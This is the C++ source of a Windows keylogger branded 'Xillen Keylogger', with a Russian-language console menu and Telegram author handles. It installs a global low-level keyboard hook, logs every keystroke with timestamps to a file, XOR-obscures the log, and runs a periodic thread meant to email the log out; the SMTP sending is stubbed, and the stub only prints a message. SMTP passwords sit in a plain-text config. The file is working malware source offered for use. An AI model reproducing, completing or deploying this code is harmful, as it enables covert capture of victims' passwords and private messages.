#include <windows.h>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <ctime>
#include <map>
#include <sstream>
#include <iomanip>
#include <wincrypt.h>
#include <shellapi.h>
#include <shlobj.h>
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shell32.lib")

std::string author = "t.me/Bengamin_Button t.me/XillenAdapter";

std::mutex logMutex;
bool running = true;
std::string logFile = "keys.log";
std::string encryptedLogFile = "keys.enc";
std::string configFile = "keylogger.cfg";
std::string email = "";
std::string smtpServer = "";
std::string smtpUser = "";
std::string smtpPass = "";
int sendInterval = 3600;

std::map<int, std::string> specialKeys = {
    {VK_SPACE, "[SPACE]"}, {VK_RETURN, "[ENTER]"}, {VK_BACK, "[BACKSPACE]"},
    {VK_TAB, "[TAB]"}, {VK_SHIFT, "[SHIFT]"}, {VK_CONTROL, "[CTRL]"},
    {VK_MENU, "[ALT]"}, {VK_ESCAPE, "[ESC]"}, {VK_CAPITAL, "[CAPSLOCK]"},
    {VK_LWIN, "[LWIN]"}, {VK_RWIN, "[RWIN]"}, {VK_DELETE, "[DEL]"},
    {VK_LEFT, "[LEFT]"}, {VK_RIGHT, "[RIGHT]"}, {VK_UP, "[UP]"}, {VK_DOWN, "[DOWN]"}
};

std::string getTimestamp() {
    std::time_t now = std::time(nullptr);
    std::tm* ptm = std::localtime(&now);
    char buffer[32];
    std::strftime(buffer, 32, "%Y-%m-%d %H:%M:%S", ptm);
    return buffer;
}

void logKey(const std::string& key) {
    std::lock_guard<std::mutex> lock(logMutex);
    std::ofstream log(logFile, std::ios::app);
    log << getTimestamp() << " " << key << std::endl;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        int vkCode = p->vkCode;
        char key[16] = {0};
        if (specialKeys.count(vkCode)) {
            logKey(specialKeys[vkCode]);
        } else {
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
            WORD wChar;
            if (ToAscii(vkCode, p->scanCode, keyboardState, &wChar, 0) == 1) {
                key[0] = (char)wChar;
                logKey(std::string(key));
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void encryptLog() {
    std::lock_guard<std::mutex> lock(logMutex);
    std::ifstream in(logFile, std::ios::binary);
    std::ofstream out(encryptedLogFile, std::ios::binary);
    char key = 0x5A;
    char c;
    while (in.get(c)) {
        out.put(c ^ key);
    }
}

void sendLogByEmail() {
    // Симуляция отправки email (реализация SMTP опущена)
    std::cout << "[EMAIL] Лог отправлен на " << email << std::endl;
}

void periodicSender() {
    while (running) {
        std::this_thread::sleep_for(std::chrono::seconds(sendInterval));
        encryptLog();
        sendLogByEmail();
    }
}

void loadConfig() {
    std::ifstream cfg(configFile);
    if (!cfg) return;
    std::string line;
    while (std::getline(cfg, line)) {
        if (line.find("email=") == 0) email = line.substr(6);
        if (line.find("smtpServer=") == 0) smtpServer = line.substr(11);
        if (line.find("smtpUser=") == 0) smtpUser = line.substr(9);
        if (line.find("smtpPass=") == 0) smtpPass = line.substr(9);
        if (line.find("sendInterval=") == 0) sendInterval = std::stoi(line.substr(13));
    }
}

void saveConfig() {
    std::ofstream cfg(configFile);
    cfg << "email=" << email << std::endl;
    cfg << "smtpServer=" << smtpServer << std::endl;
    cfg << "smtpUser=" << smtpUser << std::endl;
    cfg << "smtpPass=" << smtpPass << std::endl;
    cfg << "sendInterval=" << sendInterval << std::endl;
}

void showSettings() {
    std::cout << "=== НАСТРОЙКИ КЕЙЛОГГЕРА ===" << std::endl;
    std::cout << "Email: " << email << std::endl;
    std::cout << "SMTP сервер: " << smtpServer << std::endl;
    std::cout << "SMTP пользователь: " << smtpUser << std::endl;
    std::cout << "Интервал отправки: " << sendInterval << " сек." << std::endl;
}

void guiWindow() {
    MessageBoxA(NULL, "Xillen Keylogger активен!", "Xillen Keylogger", MB_OK | MB_ICONINFORMATION);
}

void startKeylogger() {
    HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleA(NULL), 0);
    if (!hHook) {
        std::cout << "Ошибка установки хука!" << std::endl;
        return;
    }
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    UnhookWindowsHookEx(hHook);
}

void showMenu() {
    std::cout << author << std::endl;
    std::cout << "=== XILLEN KEYLOGGER ===" << std::endl;
    std::cout << "1. Запустить кейлоггер" << std::endl;
    std::cout << "2. Настройки" << std::endl;
    std::cout << "3. Показать лог" << std::endl;
    std::cout << "4. Очистить лог" << std::endl;
    std::cout << "5. Включить GUI-окно" << std::endl;
    std::cout << "0. Выход" << std::endl;
}

int main() {
    loadConfig();
    std::thread sender(periodicSender);
    int choice;
    while (true) {
        showMenu();
        std::cout << "Выберите опцию: ";
        std::cin >> choice;
        switch (choice) {
            case 1:
                std::cout << "Кейлоггер запущен. Для выхода закройте окно." << std::endl;
                startKeylogger();
                break;
            case 2:
                showSettings();
                std::cout << "Изменить email (оставьте пусто для пропуска): ";
                std::cin.ignore();
                std::getline(std::cin, email);
                std::cout << "Изменить SMTP сервер: ";
                std::getline(std::cin, smtpServer);
                std::cout << "Изменить SMTP пользователя: ";
                std::getline(std::cin, smtpUser);
                std::cout << "Изменить SMTP пароль: ";
                std::getline(std::cin, smtpPass);
                std::cout << "Изменить интервал отправки (сек): ";
                std::string intervalStr;
                std::getline(std::cin, intervalStr);
                if (!intervalStr.empty()) sendInterval = std::stoi(intervalStr);
                saveConfig();
                break;
            case 3: {
                std::lock_guard<std::mutex> lock(logMutex);
                std::ifstream log(logFile);
                std::string line;
                while (std::getline(log, line)) std::cout << line << std::endl;
                break;
            }
            case 4: {
                std::lock_guard<std::mutex> lock(logMutex);
                std::ofstream log(logFile, std::ios::trunc);
                std::cout << "Лог очищен." << std::endl;
                break;
            }
            case 5:
                guiWindow();
                break;
            case 0:
                running = false;
                sender.detach();
                std::cout << "До свидания!" << std::endl;
                return 0;
            default:
                std::cout << "Неверный выбор!" << std::endl;
        }
    }
    return 0;
}

